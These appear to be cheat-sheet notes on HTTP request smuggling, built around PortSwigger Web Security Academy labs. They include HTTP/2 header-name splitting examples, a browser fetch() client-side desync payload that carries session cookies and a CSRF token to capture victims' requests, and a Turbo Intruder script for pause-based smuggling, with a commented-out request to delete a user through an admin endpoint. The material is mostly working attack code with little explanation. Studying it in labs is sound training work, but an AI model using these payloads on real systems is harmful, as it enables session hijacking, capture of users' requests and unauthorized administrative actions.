# Header Name Splitting

You'll find some servers don't let you use newlines in header names, but do allow colons. This only rarely enables full desynchronization, due to the trailing colon appended during the downgrade:
http2 req.
`
:method											| GET
:path												| /
:authority									| redacted.net
transfer-encoding: chunked	|	
`
http/1.1 res.
`
GET / HTTP/1.1
Host: redacted.net
transfer-encoding: chunked: 
`
It's better suited to Host-header attacks, since the Host is expected to contain a colon, and servers often ignore everything after the colon:
`
:method						|GET
:path							|/
:authority				|example.com
host: psres.net		|443
`
`
GET / HTTP/1.1
Host: example.com
Host: psres.net: 443
`
```js
fetch('https://0ae500b703a4d37580e70dd200160020.h1-web-security-academy.net', {
        method: 'POST',
        body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0ae500b703a4d37580e70dd200160020.h1-web-security-academy.net\r\nCookie: session=p9lZsHnJfmKlqDhAS4cYqTvmV8YsFWql;_lab_analytics=bvD4R2gADi2JHlanph70z3Qct09t0HPFLEHZ0xaV13qA0cSJIqJl99A7cfBJsPetbeWjVh5ARizGDwG8kCgP2KNDqYKeGgMo33oCfJ9XyGERswXOtuo7LXfuYJ9YGiAI2Aj5TZnFfePJFU5aL8Dq5Neb1WPIRpM8fBMpwUy2Flb3c2RPUR355E6clcv2GQC9vAjtzudmQ0Z4z9agAbqgnXHY4jOdRy2MpNUgo7hZtrdzka2DRPxD6PQ0t4jEF40s\r\nContent-Length: 800\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=fN7Ry4dPwbFGi7F7ZNVUhqyH5oSTrout&postId=10&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=',
        mode: 'cors',
        credentials: 'include',
    }).catch(() => {
        fetch('https://0ae500b703a4d37580e70dd200160020.h1-web-security-academy.net/capture-me', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```

## Server-side pause-based request smuggling
### using turbo intruder
```py
def queueRequests(target, _):
    engine = RequestEngine(endpoint="https://lab-id.web-security-academy.net:443",
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    
    # attack request
    attack_request = """POST /resources HTTP/1.1
Host: lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: %s

%s"""

    # smuggled request GET
    smuggled_request = """GET /uripathdoesnotexist/ HTTP/1.1
Host: lab-id.web-security-academy.net

"""

    # smuggled request POST
    # smuggled_request = """POST /admin/delete/ HTTP/1.1
# Content-Length: 53
# Cookie: session=REPLACE-ME
# Host: localhost

# csrf=REPLACE-ME&username=carlos

# """

    # normal request
    normal_request = """GET / HTTP/1.1
Host: lab-id.web-security-academy.net

"""
    engine.queue(attack_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nGET'], pauseTime=61000)
    engine.queue(normal_request)


def handleResponse(req, _):
    table.add(req)

```

